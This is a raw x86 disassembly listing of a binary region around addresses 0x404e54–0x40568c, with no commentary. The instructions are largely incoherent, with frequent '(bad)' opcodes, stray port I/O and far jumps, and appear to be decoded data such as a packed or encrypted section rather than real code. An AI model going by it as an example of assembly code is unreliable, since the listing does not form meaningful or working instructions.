  404e54:	inc    esi
  404e55:	mov    ecx,esi
  404e57:	adc    eax,esi
  404e59:	inc    edx
  404e5a:	in     al,dx
  404e5b:	lods   eax,DWORD PTR ds:[esi]
  404e5c:	mov    ds:0x75303a2a,eax
  404e61:	or     BYTE PTR [esi+0xe],al
  404e64:	push   ds
  404e65:	pop    ss
  404e66:	mov    edx,0xf139fb50
  404e6b:	je     0x404ebc
  404e6d:	adc    dl,BYTE PTR [esi]
  404e6f:	cmp    al,0x45
  404e71:	mov    eax,ds:0x5dab5246
  404e76:	mov    cl,0x7f
  404e78:	adc    al,0xe2
  404e7a:	pop    eax
  404e7b:	add    edx,eax
  404e7d:	aas    
  404e7e:	dec    esp
  404e7f:	jne    0x404eb4
  404e81:	pop    ss
  404e82:	or     al,0x53
  404e84:	sub    eax,0x2282cf57
  404e89:	sub    esp,edx
  404e8b:	(bad)  
  404e8c:	div    BYTE PTR [edi-0x1f26fdaf]
  404e92:	sbb    BYTE PTR [eax+0x523fdf04],cl
  404e98:	in     eax,dx
  404e99:	inc    edx
  404e9a:	pop    esp
  404e9b:	pushf  
  404e9c:	fstp   TBYTE PTR [edi]
  404e9e:	jle    0x404f06
  404ea0:	test   eax,0x9afbc2eb
  404ea5:	and    esp,edx
  404ea7:	mov    al,0x1
  404ea9:	inc    edx
  404eaa:	ret    0x6d8b
  404ead:	xchg   ecx,eax
  404eae:	pop    edi
  404eaf:	stos   DWORD PTR es:[edi],eax
  404eb0:	std    
  404eb1:	jne    0x404e9e
  404eb3:	push   esi
  404eb4:	data16 add al,0x3c
  404eb7:	and    dh,bl
  404eb9:	ret    0xacd8
  404ebc:	mov    bh,0x6
  404ebe:	push   ds
  404ebf:	jmp    FWORD PTR [edx+edi*1]
  404ec2:	add    al,0xa
  404ec4:	jae    0x404ed5
  404ec6:	fimul  DWORD PTR ds:0x2dab153
  404ecc:	inc    edx
  404ecd:	jmp    0x404f45
  404ecf:	mov    esi,0x1beab3c6
  404ed4:	mov    cl,BYTE PTR [esi]
  404ed6:	sti    
  404ed7:	scas   eax,DWORD PTR es:[edi]
  404ed8:	stc    
  404ed9:	xchg   ebx,eax
  404eda:	in     eax,dx
  404edb:	jp     0x404ed8
  404edd:	mov    cl,0x29
  404edf:	push   cs
  404ee0:	inc    esi
  404ee1:	imul   edx,edx,0xa
  404ee4:	pop    DWORD PTR [ecx+0x72c8f4fa]
  404eea:	jmp    0x21b:0xf6841467
  404ef1:	mov    ah,0x15
  404ef3:	test   eax,0x4f80d8a
  404ef9:	cmp    DWORD PTR [edx+0xf],ebp
  404efc:	ficom  WORD PTR [ebp+0x0]
  404eff:	adc    esp,DWORD PTR [edi+0x4ac09a36]
  404f05:	ret    0x752
  404f08:	daa    
  404f09:	pop    eax
  404f0a:	(bad)  
  404f0b:	push   ebp
  404f0c:	aas    
  404f0d:	mov    ebx,DWORD PTR [ebx+0x6f]
  404f10:	enter  0x2643,0x5b
  404f14:	das    
  404f15:	add    BYTE PTR [ecx+0x14560801],dh
  404f1b:	push   ss
  404f1c:	jb     0x404f55
  404f1e:	or     BYTE PTR [esp+ebp*8+0x4],dh
  404f22:	add    dl,dh
  404f24:	pop    ecx
  404f25:	jo     0x404f2b
  404f27:	iret   
  404f28:	sbb    BYTE PTR [eax+ebx*4],0x21
  404f2c:	mov    ds,WORD PTR [esi]
  404f2e:	aam    0x80
  404f30:	ins    DWORD PTR es:[edi],dx
  404f31:	mov    edi,0x2cdb2321
  404f36:	and    al,0xdd
  404f38:	push   ds
  404f39:	fwait
  404f3a:	and    BYTE PTR [ebx+ebp*1],cl
  404f3d:	pushf  
  404f3e:	mov    al,0x84
  404f40:	pop    esp
  404f41:	fnstenv [ebx-0x4f]
  404f44:	add    DWORD PTR [ebx-0x5c697c40],esp
  404f4a:	add    ecx,esp
  404f4c:	lock xchg dh,dl
  404f4f:	pusha  
  404f50:	frstor [eax-0x7c8fbedf]
  404f56:	in     al,dx
  404f57:	or     ch,bl
  404f59:	inc    ecx
  404f5a:	cmp    bh,BYTE PTR [esi+0x589b24b9]
  404f60:	pop    edx
  404f61:	jmp    0x404f74
  404f63:	div    DWORD PTR [ebx-0x60b48be7]
  404f69:	xchg   ebp,eax
  404f6a:	push   0x509600a
  404f6f:	pop    edx
  404f70:	xchg   ebp,eax
  404f71:	sub    BYTE PTR [ecx-0x5d72bf94],cl
  404f77:	adc    DWORD PTR [edx-0x15],ecx
  404f7a:	or     BYTE PTR [esi+eax*4],dl
  404f7d:	call   0xe64d431c
  404f82:	pop    eax
  404f83:	xchg   esi,eax
  404f84:	outs   dx,DWORD PTR ds:[esi]
  404f85:	das    
  404f86:	(bad)  
  404f87:	sbb    BYTE PTR [ebx+0x4d],dh
  404f8a:	add    eax,0x47733cfa
  404f8f:	stc    
  404f90:	inc    ecx
  404f91:	ss mov eax,0x4fee8054
  404f97:	jae    0x404fd3
  404f99:	hlt    
  404f9a:	rol    BYTE PTR [esi-0xb],0xdb
  404f9e:	mov    bh,0x33
  404fa0:	sub    dh,0x36
  404fa3:	add    BYTE PTR [eax],cl
  404fa5:	shr    BYTE PTR [ecx-0x2e],cl
  404fa8:	pusha  
  404fa9:	jmp    0xc2db:0x2e4d456f
  404fb0:	or     dl,cl
  404fb2:	call   0xae0384ba
  404fb7:	stos   DWORD PTR es:[edi],eax
  404fb8:	push   ecx
  404fb9:	dec    edx
  404fba:	fild   DWORD PTR [edx]
  404fbc:	fdiv   DWORD PTR ds:0x8d8a999
  404fc2:	inc    edi
  404fc3:	mov    esp,0x9b18dd92
  404fc8:	sbb    edx,DWORD PTR [ebx]
  404fca:	pop    esi
  404fcb:	push   0x162f5dc6
  404fd0:	mov    ecx,ebx
  404fd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404fd3:	dec    esp
  404fd4:	mov    bh,0x6c
  404fd6:	aaa    
  404fd7:	rcl    DWORD PTR [eax+0x75ff2241],0x10
  404fde:	add    cl,BYTE PTR [esi+esi*8]
  404fe1:	fwait
  404fe2:	mov    edx,0x72da3412
  404fe7:	xlat   BYTE PTR ds:[ebx]
  404fe8:	hlt    
  404fe9:	lea    ecx,[ebp-0x2]
  404fec:	mov    dx,0x6763
  404ff0:	bound  ebp,QWORD PTR [ebx-0x80]
  404ff3:	add    ah,BYTE PTR [ecx+ebx*4-0x35]
  404ff7:	jo     0x405008
  404ff9:	ror    BYTE PTR [ebp+0x3c6445],cl
  404fff:	jnp    0x404fd0
  405001:	adc    bh,ah
  405003:	jae    0x429344e
  405009:	pop    edx
  40500a:	or     al,0x2b
  40500c:	enter  0xdb61,0x82
  405010:	outs   dx,DWORD PTR ds:[esi]
  405011:	sbb    ecx,eax
  405013:	and    eax,0x3
  405016:	int3   
  405017:	and    DWORD PTR [ecx],ecx
  405019:	fnstenv [esi]
  40501b:	mov    bh,0xdf
  40501d:	loop   0x40508a
  40501f:	mov    esi,0xf64e3310
  405024:	test   edx,edx
  405026:	jne    0x40503c
  405028:	push   cs
  405029:	mov    ecx,0xa0b44190
  40502e:	xchg   ecx,eax
  40502f:	add    ecx,esi
  405031:	sahf   
  405032:	add    eax,0x4f212cb1
  405037:	xchg   edi,eax
  405038:	fisttp WORD PTR [esi+0xc52e1d0]
  40503e:	add    esi,DWORD PTR [ebx+0x18]
  405041:	dec    esi
  405042:	jg     0x404fd1
  405044:	add    al,0x40
  405046:	add    eax,0x26c50b7
  40504b:	lds    esi,FWORD PTR [esi-0x2c]
  40504e:	jecxz  0x405067
  405050:	js     0x40505d
  405052:	cmp    ebx,0xfffffffe
  405055:	add    DWORD PTR [edi],ecx
  405057:	or     BYTE PTR [esi+0xf251b57],0x87
  40505e:	xor    DWORD PTR [esi-0x375c2445],0xffffffe9
  405065:	jb     0x4050e4
  405067:	add    eax,0xb77770c
  40506c:	sti    
  40506d:	mov    edi,0x715b6223
  405072:	jle    0x40503b
  405074:	inc    eax
  405075:	cmp    ebx,DWORD PTR [edx+eax*2-0x2]
  405079:	ja     0x4050df
  40507b:	and    dh,BYTE PTR [ecx+0x480c7500]
  405081:	aaa    
  405082:	adc    DWORD PTR [edi-0xa],edi
  405085:	lods   eax,DWORD PTR ds:[esi]
  405086:	sar    edi,0x16
  405089:	add    ebx,DWORD PTR [edx+ecx*2-0x2]
  40508d:	inc    ecx
  40508e:	dec    eax
  40508f:	push   0x8b49ce18
  405094:	shl    DWORD PTR [ebp+0x3f82ea20],0x99
  40509b:	idiv   esi
  40509d:	imul   esi,ecx,0xddd17f6d
  4050a3:	mov    ebp,0x3d6c9f6
  4050a8:	repnz sub esi,eax
  4050ab:	pop    ds
  4050ac:	mov    dh,0x1f
  4050ae:	stc    
  4050af:	add    esi,eax
  4050b1:	test   DWORD PTR [esi],edx
  4050b3:	loope  0x40506b
  4050b5:	das    
  4050b6:	ret    
  4050b7:	add    al,0x81
  4050b9:	out    dx,al
  4050ba:	ret    
  4050bb:	cmp    eax,0x2545966e
  4050c0:	test   ah,dh
  4050c2:	push   0x792d16ef
  4050c7:	and    bh,0xe4
  4050ca:	ret    0x3d4b
  4050cd:	cmp    DWORD PTR [eax+ebp*2+0x61e84de4],eax
  4050d4:	jg     0x4050a2
  4050d6:	mov    ebp,0x499f4686
  4050db:	(bad)  
  4050dc:	xchg   ebp,eax
  4050dd:	fld    DWORD PTR [edi]
  4050df:	push   es
  4050e0:	push   cs
  4050e1:	pop    ebx
  4050e2:	in     al,0xf4
  4050e4:	add    al,0x3
  4050e6:	sub    dh,BYTE PTR [edi-0x22d8af46]
  4050ec:	jne    0x405157
  4050ee:	mov    eax,ds:0x49034207
  4050f3:	mov    sp,0xf42f
  4050f7:	or     eax,0xb1f981a7
  4050fc:	cmp    dh,BYTE PTR ds:0xe981137c
  405102:	pop    es
  405103:	shl    dh,1
  405105:	lods   al,BYTE PTR ds:[esi]
  405106:	sub    eax,0x12a2c309
  40510b:	jge    0x4050fa
  40510d:	pusha  
  40510e:	repnz add BYTE PTR [ebx],ah
  405111:	mov    esp,0x9ff02fd0
  405116:	lods   al,BYTE PTR ds:[esi]
  405117:	mov    ss,WORD PTR [ecx-0x49489960]
  40511d:	mov    ebp,0x4f04c7b5
  405122:	dec    WORD PTR [ebp+0x14]
  405126:	sbb    DWORD PTR [esi+edx*1],0x2d0d6b66
  40512d:	jbe    0x40519a
  40512f:	push   ds
  405130:	adc    eax,0x1429d803
  405135:	int    0xf2
  405137:	not    BYTE PTR [esi]
  405139:	int3   
  40513a:	cs mov ch,0x5
  40513d:	sub    al,0xfe
  40513f:	shl    eax,0x2
  405142:	sbb    eax,0x4615806d
  405147:	sbb    BYTE PTR [edx+0x15],cl
  40514a:	adc    BYTE PTR [esi+0x5d276c17],al
  405150:	pushf  
  405151:	test   al,0x80
  405153:	and    eax,DWORD PTR [ecx-0x28]
  405156:	adc    cl,BYTE PTR [edx+0x66ecabc2]
  40515c:	in     eax,dx
  40515d:	int    0xd5
  40515f:	push   esi
  405160:	fdivr  QWORD PTR [edi]
  405162:	enter  0x5690,0x4c
  405166:	dec    esi
  405167:	(bad)  
  405168:	mov    esp,0x735b6ee6
  40516d:	test   DWORD PTR ss:[esi+0x3b],0x90b7207
  405175:	or     eax,0xcbd05f54
  40517a:	sub    DWORD PTR [eax-0x15],eax
  40517d:	fsubr  QWORD PTR [ecx+0x19]
  405180:	pop    ebx
  405181:	imul   eax,DWORD PTR [esi-0x7f1a4f96],0x12
  405188:	or     dh,ah
  40518a:	pop    esp
  40518b:	xchg   esi,eax
  40518c:	and    DWORD PTR [edx],esi
  40518e:	sub    edx,DWORD PTR ss:[ecx+0x51]
  405192:	push   edi
  405193:	xor    ebp,DWORD PTR [esi+ebx*2-0x10]
  405197:	aas    
  405198:	add    ah,BYTE PTR [esi]
  40519a:	(bad)  
  40519b:	push   ecx
  40519c:	mov    WORD PTR [ebp+0x5edefe22],fs
  4051a2:	fcmovb st,st(1)
  4051a4:	cmp    BYTE PTR [eax+ecx*2],ch
  4051a7:	mov    ebx,DWORD PTR [esi]
  4051a9:	clc    
  4051aa:	retf   0xd268
  4051ad:	jbe    0x405171
  4051af:	cld    
  4051b0:	mov    ecx,0x4049f937
  4051b5:	add    al,0xa0
  4051b7:	inc    edx
  4051b8:	add    edx,DWORD PTR ds:0x324bb514
  4051be:	xor    eax,0x848fa434
  4051c3:	adc    bh,al
  4051c5:	dec    ebp
  4051c6:	mov    ebx,0x47750340
  4051cb:	mov    esi,0xfafc992b
  4051d0:	rol    DWORD PTR [eax],cl
  4051d2:	rcl    ebp,1
  4051d4:	push   ss
  4051d5:	inc    esp
  4051d6:	fiadd  DWORD PTR [edx+0x1a]
  4051d9:	in     al,0x88
  4051db:	mov    ebx,0x1292bcd7
  4051e0:	and    BYTE PTR [ebp-0x1740ee6c],cl
  4051e6:	sti    
  4051e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4051e8:	stos   BYTE PTR es:[edi],al
  4051e9:	adc    DWORD PTR [esi],edi
  4051eb:	or     BYTE PTR [ecx],al
  4051ed:	cwde   
  4051ee:	sbb    DWORD PTR [ebx+0x4],ebx
  4051f1:	popf   
  4051f2:	pop    esp
  4051f3:	adc    ebp,DWORD PTR [edi-0x38]
  4051f6:	sbb    eax,0x86c7b0c5
  4051fb:	(bad)  [eax]
  4051fd:	jne    0x4051cf
  4051ff:	pop    ecx
  405200:	pop    ds
  405201:	arpl   bx,sp
  405203:	aaa    
  405204:	retf   
  405205:	pop    ebx
  405206:	dec    ebp
  405207:	and    eax,0xe03f046a
  40520c:	fimul  DWORD PTR ss:[ebp+ebp*8+0x6a]
  405211:	in     al,0x80
  405213:	call   0xe0f369de
  405218:	mov    al,ds:0xb92dae86
  40521d:	mov    ecx,0xbabb7821
  405222:	xor    BYTE PTR [ebx+0x4d],dh
  405225:	int    0xdb
  405227:	fcmovbe st,st(0)
  405229:	push   cs
  40522a:	inc    edi
  40522b:	jno    0x4051b7
  40522d:	push   es
  40522e:	mov    ecx,DWORD PTR [ebx]
  405230:	scas   eax,DWORD PTR es:[edi]
  405231:	push   ecx
  405232:	pop    esp
  405233:	aaa    
  405234:	adc    eax,0x1054b570
  405239:	xor    cl,0x2b
  40523c:	adc    BYTE PTR [edx-0x4ba244ee],cl
  405242:	ja     0x4051e5
  405244:	cmp    dl,BYTE PTR [ecx-0x5]
  405247:	je     0x4052a9
  405249:	dec    esp
  40524a:	cld    
  40524b:	inc    eax
  40524c:	mov    eax,0x776d4289
  405251:	shl    DWORD PTR [eax-0x7fd1f40c],0x78
  405258:	in     eax,dx
  405259:	inc    ebp
  40525a:	sub    bl,BYTE PTR [ecx]
  40525c:	fimul  DWORD PTR [ebp+0x70893f07]
  405262:	or     al,0x2
  405264:	pop    ds
  405265:	fnsave [edi]
  405267:	idiv   BYTE PTR [ebx+0x5ee48d2]
  40526d:	push   eax
  40526e:	lock dec edi
  405270:	repnz push 0x24c60a74
  405276:	retf   
  405277:	popa   
  405278:	in     eax,dx
  405279:	inc    eax
  40527a:	in     eax,dx
  40527b:	add    DWORD PTR [ecx],edi
  40527d:	aaa    
  40527e:	jecxz  0x4052b1
  405280:	enter  0xd8c8,0x2d
  405284:	sub    esp,esp
  405286:	push   eax
  405287:	ds out 0xe8,al
  40528a:	sbb    ch,dl
  40528c:	xchg   ecx,eax
  40528d:	int    0xea
  40528f:	jb     0x40524d
  405291:	jecxz  0x405294
  405293:	lahf   
  405294:	ficom  WORD PTR [edx-0x70]
  405297:	cmp    esp,esp
  405299:	(bad)  
  40529a:	xor    al,0x8d
  40529c:	or     DWORD PTR [esi-0x7f],edx
  40529f:	and    esi,DWORD PTR [esi]
  4052a1:	add    ah,bh
  4052a3:	into   
  4052a4:	(bad)  
  4052a5:	jo     0x4052ba
  4052a7:	bound  esi,QWORD PTR [edx]
  4052a9:	js     0x4052e3
  4052ab:	cmp    BYTE PTR [ecx],bh
  4052ad:	sub    eax,DWORD PTR [ebp-0x27]
  4052b0:	sbb    al,0x40
  4052b2:	lahf   
  4052b3:	or     dh,al
  4052b5:	inc    esp
  4052b6:	scas   al,BYTE PTR es:[edi]
  4052b7:	out    0xa4,al
  4052b9:	jmp    0xad54:0x3caceeee
  4052c0:	mov    ecx,0xc894783e
  4052c5:	aas    
  4052c6:	pop    ss
  4052c7:	call   0xa8c4849c
  4052cc:	(bad)
  4052cf:	mov    bl,BYTE PTR [esi-0x20a63e1e]
  4052d5:	cmp    ch,dh
  4052d7:	fadd   DWORD PTR [esi+0x2cea70b7]
  4052dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4052de:	push   ebp
  4052df:	aaa    
  4052e0:	xchg   ebp,eax
  4052e1:	sub    ah,BYTE PTR [eax+0x5c]
  4052e4:	shl    BYTE PTR [edi+0x41],0x1d
  4052e8:	dec    esi
  4052e9:	jne    0xa843c977
  4052ef:	add    esp,0x3c
  4052f2:	mov    esi,DWORD PTR [edx+eiz*1+0x4]
  4052f6:	adc    DWORD PTR [eax-0x58],edx
  4052f9:	lock or eax,0x51c37d75
  4052ff:	call   0x2df089b
  405304:	popf   
  405305:	cmp    ch,cl
  405307:	or     eax,0x60eb1432
  40530c:	test   BYTE PTR [esi+0x57af0ec4],dh
  405312:	inc    eax
  405313:	jle    0x40536c
  405315:	push   ss
  405316:	loop   0x4052f5
  405318:	and    eax,0x9b0837e8
  40531d:	rol    BYTE PTR [ebp+0x75],0x42
  405321:	sub    eax,DWORD PTR [ebx]
  405323:	xlat   BYTE PTR ds:[ebx]
  405324:	add    dh,BYTE PTR [ebx+0x6cd49c27]
  40532a:	xchg   edx,eax
  40532b:	dec    eax
  40532c:	scas   eax,DWORD PTR es:[edi]
  40532d:	pop    edi
  40532e:	nop
  40532f:	jmp    0x405366
  405331:	mov    ds:0x8bd974f8,eax
  405336:	ja     0x405310
  405338:	or     DWORD PTR [edx+0xd],esp
  40533b:	or     BYTE PTR [ebx-0x3d],ah
  40533e:	sbb    edi,DWORD PTR [ebx+0x59]
  405341:	les    eax,FWORD PTR [ebx-0x7b874f19]
  405347:	or     esp,DWORD PTR ss:[ebx]
  40534a:	mov    dh,BYTE PTR [eax]
  40534c:	sbb    BYTE PTR [ebp-0x13],ah
  40534f:	and    al,0xd0
  405351:	mov    ebp,fs
  405353:	or     BYTE PTR [ebx+0x67],cl
  405356:	add    eax,DWORD PTR [bp+di]
  405359:	popa   
  40535a:	enter  0x6b08,0xec
  40535e:	gs leave 
  405360:	and    eax,0x7679c843
  405365:	in     al,dx
  405366:	out    dx,al
  405367:	repnz test BYTE PTR [ebx+0x74],cl
  40536b:	repnz inc edx
  40536d:	jg     0x40537e
  40536f:	push   0x79
  405371:	mov    WORD PTR [edx+0x20],?
  405374:	dec    edi
  405375:	cmp    bl,ch
  405377:	or     eax,0xec987979
  40537c:	jns    0x4053f6
  40537e:	and    al,0x43
  405380:	in     al,dx
  405381:	je     0x4053b6
  405383:	jne    0x405371
  405385:	cld    
  405386:	test   DWORD PTR [edx+0xb],eax
  405389:	xchg   esp,eax
  40538a:	daa    
  40538b:	cmp    BYTE PTR [eax],0x30
  40538e:	jne    0x4053a7
  405390:	push   ebx
  405391:	xor    BYTE PTR [ecx+eiz*8+0x49c84421],ah
  405398:	add    cl,BYTE PTR gs:[ebp-0x7a]
  40539c:	in     al,dx
  40539d:	add    BYTE PTR [ebx],0x79
  4053a0:	jge    0x40539a
  4053a2:	lock mov esi,0xf793d8c8
  4053a8:	jns    0x405423
  4053aa:	add    BYTE PTR [ebx],cl
  4053ac:	add    al,0xd
  4053ae:	add    BYTE PTR [ebp+0x44],dh
  4053b1:	out    0xc,al
  4053b3:	inc    edi
  4053b4:	aam    0x31
  4053b6:	aam    0x27
  4053b8:	push   ecx
  4053b9:	pop    ebp
  4053ba:	mov    ah,0x2
  4053bc:	fdivr  st,st(7)
  4053be:	jne    0x405361
  4053c0:	or     edx,0x4691530d
  4053c6:	lahf   
  4053c7:	push   ss
  4053c8:	pop    ebp
  4053c9:	pop    es
  4053ca:	mov    bl,0xad
  4053cc:	cmp    DWORD PTR [esi],0xffffffb6
  4053cf:	mov    eax,0x4df10282
  4053d4:	mulps  xmm5,XMMWORD PTR [esi-0x69]
  4053d8:	into   
  4053d9:	inc    DWORD PTR [eax+0x320e292]
  4053df:	in     eax,dx
  4053e0:	add    bl,ah
  4053e2:	sub    eax,0xe1aa7c00
  4053e7:	mov    esp,0x841381
  4053ec:	sqrtps xmm0,XMMWORD PTR [ecx]
  4053ef:	or     al,0xde
  4053f1:	adc    DWORD PTR [edi+ecx*1],edi
  4053f4:	sbb    BYTE PTR [ecx+0x5a3d354],ch
  4053fa:	scas   al,BYTE PTR es:[edi]
  4053fb:	add    al,0x49
  4053fd:	cmc    
  4053fe:	push   es
  4053ff:	ds fwait
  405401:	aam    0xec
  405403:	adc    bl,BYTE PTR [ebp+0x10ad0698]
  405409:	mov    eax,0x3c120689
  40540e:	ins    BYTE PTR es:[edi],dx
  40540f:	test   BYTE PTR [edx+0x3e],0x11
  405413:	mov    bl,BYTE PTR [ebp-0x16]
  405416:	cwde   
  405417:	into   
  405418:	add    ah,bh
  40541a:	add    al,0x9f
  40541c:	sub    al,0x1a
  40541e:	jae    0x4053a6
  405420:	or     bh,BYTE PTR [edi+0x6d6f8a8]
  405426:	mov    ds:0x7d80ba4d,eax
  40542b:	loop   0x405475
  40542d:	(bad)  
  40542e:	dec    eax
  40542f:	inc    eax
  405430:	pop    edi
  405431:	or     DWORD PTR [esi-0x78],0x5d
  405435:	loop   0x405474
  405437:	ficomp WORD PTR [ebx+0x8]
  40543a:	inc    edi
  40543b:	lods   eax,DWORD PTR ds:[esi]
  40543c:	sar    DWORD PTR [eax],0xe2
  40543f:	cmp    dh,BYTE PTR [edi-0x20479422]
  405445:	fidivr DWORD PTR [edx-0x79]
  405448:	jmp    DWORD PTR [eax*4+0x4ebd506]
  40544f:	jecxz  0x4054b8
  405451:	xchg   ebx,eax
  405452:	cld    
  405453:	add    BYTE PTR ds:0xb060e00,cl
  405459:	add    BYTE PTR [eax*1+0x47c05e8c],cl
  405460:	jno    0x405464
  405462:	push   es
  405463:	mov    eax,DWORD PTR [edi]
  405465:	mov    dh,0x73
  405467:	mov    ecx,0xaefa8f6d
  40546c:	or     al,BYTE PTR [ebx]
  40546e:	add    DWORD PTR ds:0xb9a5007b,0x7c4f4d34
  405478:	test   eax,0xa5bb0e7c
  40547d:	imul   ebp,DWORD PTR [esi],0xffce7dcd
  405483:	jle    0x4054b5
  405485:	gs xchg esi,eax
  405487:	mov    ebx,0x80cd34db
  40548c:	(bad)  
  40548e:	xchg   ebx,eax
  40548f:	mov    dl,0x55
  405491:	ret    
  405492:	jbe    0x405414
  405494:	pop    ecx
  405495:	push   es
  405496:	outs   dx,DWORD PTR ds:[esi]
  405497:	mov    ds:0x59b01d41,eax
  40549c:	mov    esp,0x2ff232c
  4054a1:	add    esp,0x7
  4054a4:	and    eax,0x6df1ecb9
  4054a9:	or     ebp,0x3e
  4054ac:	test   al,dl
  4054ae:	jbe    0x4054e4
  4054b0:	pop    ecx
  4054b1:	sti    
  4054b2:	and    bh,BYTE PTR [edx-0x4f49e904]
  4054b8:	add    al,0x17
  4054ba:	dec    esi
  4054bb:	and    eax,0xd9af8d55
  4054c0:	cdq    
  4054c1:	sub    BYTE PTR [ebx+0x28771003],dh
  4054c7:	fsubr  DWORD PTR [esp+esi*1]
  4054ca:	dec    edi
  4054cb:	push   es
  4054cc:	xchg   edx,eax
  4054cd:	adc    al,0xd4
  4054cf:	js     0x405465
  4054d1:	aam    0x64
  4054d3:	mov    bh,BYTE PTR [eax]
  4054d5:	nop
  4054d6:	hlt    
  4054d7:	dec    eax
  4054d8:	pop    eax
  4054d9:	jbe    0x4054fd
  4054db:	call   0x8c30:0xeb18e7bd
  4054e2:	mov    al,ds:0x51fbe4a2
  4054e7:	push   edi
  4054e8:	lock sbb edx,DWORD PTR [esi-0x64]
  4054ec:	sbb    DWORD PTR [eax+ebx*1],edx
  4054ef:	mov    dh,0xb2
  4054f1:	add    ecx,esp
  4054f3:	fs pop ebp
  4054f5:	retf   
  4054f6:	ficomp WORD PTR [esi+0x20]
  4054f9:	icebp  
  4054fa:	dec    eax
  4054fb:	je     0x405546
  4054fd:	add    ch,BYTE PTR [ebp-0x15]
  405500:	jg     0x4054a6
  405502:	or     DWORD PTR [eax-0x1195836b],edi
  405508:	add    ecx,DWORD PTR [ebp-0x21]
  40550b:	cdq    
  40550c:	mov    eax,ds:0xdf942e8f
  405511:	pop    ebp
  405512:	cld    
  405513:	es adc al,0x44
  405516:	dec    eax
  405517:	push   ds
  405518:	and    eax,0xb931857
  40551d:	fnstenv ds:0x79138472
  405523:	pushf  
  405524:	mov    BYTE PTR [ecx],al
  405526:	ss dec esi
  405528:	or     DWORD PTR [ecx],edx
  40552a:	call   0xa220eb88
  40552f:	push   ecx
  405530:	mov    bl,ch
  405532:	push   edx
  405533:	sbb    eax,0x7d7d1bdc
  405538:	xchg   BYTE PTR [esi-0x48],ah
  40553b:	or     DWORD PTR [ebx+0x1210d5db],esp
  405541:	scas   eax,DWORD PTR es:[edi]
  405542:	dec    ebx
  405543:	das    
  405544:	(bad)  
  405545:	retf   
  405546:	and    cl,BYTE PTR [edi]
  405548:	mov    dh,0x74
  40554a:	dec    eax
  40554b:	jg     0x405564
  40554d:	cmp    al,0x82
  40554f:	retf   
  405550:	fistp  DWORD PTR [edi]
  405552:	inc    esp
  405553:	sbb    eax,0x4667422
  405558:	add    eax,0x461a6174
  40555d:	stos   DWORD PTR es:[edi],eax
  40555e:	xchg   edi,eax
  40555f:	push   DWORD PTR [esi+ecx*1-0x15]
  405563:	bound  eax,QWORD PTR [ebx+0x77461e8]
  405569:	pop    es
  40556a:	je     0x4055d3
  40556c:	push   0x5d8276c8
  405571:	mov    bh,0x5e
  405573:	jne    0x4055c5
  405575:	xor    al,0x81
  405577:	push   esp
  405578:	cli    
  405579:	dec    ebp
  40557a:	or     edi,ecx
  40557c:	jmp    0x4055f8
  40557e:	fs cwde 
  405580:	push   ss
  405581:	sub    al,0x15
  405583:	pop    esp
  405584:	mov    ecx,0x909d3203
  405589:	lahf   
  40558a:	push   ss
  40558b:	pusha  
  40558c:	mov    ecx,0x7c1d7504
  405591:	scas   al,BYTE PTR es:[edi]
  405592:	ins    DWORD PTR es:[edi],dx
  405593:	outs   dx,DWORD PTR ds:[esi]
  405594:	mov    bh,0xc3
  405596:	pop    ss
  405597:	mov    ch,BYTE PTR [esp+esi*1-0xfb77ff]
  40559e:	sbb    DWORD PTR [ebx*8+0x6c004f40],ebx
  4055a5:	dec    edx
  4055a6:	xor    eax,0xdeea7d8b
  4055ab:	sub    bh,BYTE PTR [eax-0x57]
  4055ae:	push   0x6615749d
  4055b3:	cwde   
  4055b4:	push   es
  4055b5:	mov    di,0xf971
  4055b9:	shr    DWORD PTR ds:0x40aeb28,1
  4055bf:	jbe    0x4055c5
  4055c1:	out    dx,eax
  4055c2:	or     al,0xe1
  4055c4:	shr    DWORD PTR [edx+0x77e9df8],1
  4055ca:	nop
  4055cb:	mov    WORD PTR [ecx+0x384b095b],cs
  4055d1:	(bad)  
  4055d2:	mov    BYTE PTR [edx],dl
  4055d4:	das    
  4055d5:	sub    ah,cl
  4055d7:	inc    ecx
  4055d8:	add    BYTE PTR [edx+0x9703630],cl
  4055de:	fs out 0x29,al
  4055e1:	aaa    
  4055e2:	adc    al,0x90
  4055e4:	add    esp,esp
  4055e6:	adc    BYTE PTR [ecx+0x325c9c98],ch
  4055ec:	shl    BYTE PTR [ebp-0x1bfcfc9b],cl
  4055f2:	rcl    eax,0x35
  4055f5:	sub    al,0x73
  4055f8:	dec    eax
  4055f9:	lods   eax,DWORD PTR ds:[esi]
  4055fa:	je     0x405632
  4055fc:	ss hlt 
  4055fe:	add    BYTE PTR [ebp+0x29],dh
  405601:	mov    ecx,0x83ff0cea
  405606:	call   0xa050:0x12d14e9d
  40560d:	pop    ds
  40560e:	dec    edx
  40560f:	mov    BYTE PTR ds:0x683acfe,bl
  405615:	add    al,0x68
  405617:	dec    ebx
  405618:	popf   
  405619:	test   DWORD PTR [esp+ebx*2+0x1023ed8],ecx
  405620:	ins    BYTE PTR es:[edi],dx
  405621:	dec    edx
  405622:	dec    eax
  405623:	enter  0xc602,0x33
  405627:	ds mov al,0x67
  40562a:	sbb    al,0x76
  40562c:	jae    0x40563f
  40562e:	in     al,dx
  40562f:	nop
  405630:	mov    esi,0x32100feb
  405635:	and    ebx,ebx
  405637:	in     al,0x94
  405639:	dec    eax
  40563a:	add    ebp,DWORD PTR [eax+0x28]
  40563d:	imul   ecx,DWORD PTR [ecx+0x47],0x841a5731
  405644:	popf   
  405645:	leave  
  405646:	pop    esp
  405647:	dec    edx
  405648:	into   
  405649:	jo     0x405691
  40564b:	dec    ecx
  40564c:	jo     0x405691
  40564e:	pop    edx
  40564f:	mov    dl,bl
  405651:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405652:	pop    eax
  405653:	mov    bl,0xd8
  405655:	push   es
  405656:	mov    ?,ebx
  405658:	div    esp
  40565a:	add    BYTE PTR [ebx],cl
  40565c:	inc    edx
  40565d:	inc    edx
  40565e:	pop    edx
  40565f:	or     BYTE PTR [esi+0x74b341f4],0xdb
  405666:	sub    DWORD PTR [edx],edx
  405668:	push   es
  405669:	call   0x75c13c79
  40566e:	adc    eax,0x76
  405671:	rol    ah,cl
  405673:	mov    eax,0x744e7497
  405678:	fld    QWORD PTR [ebx]
  40567a:	mov    WORD PTR [edi],es
  40567c:	cmp    BYTE PTR ds:0x9d348110,0xc6
  405683:	inc    esi
  405684:	out    0x92,al
  405686:	jae    0x905de2b1
  40568c:	ret    
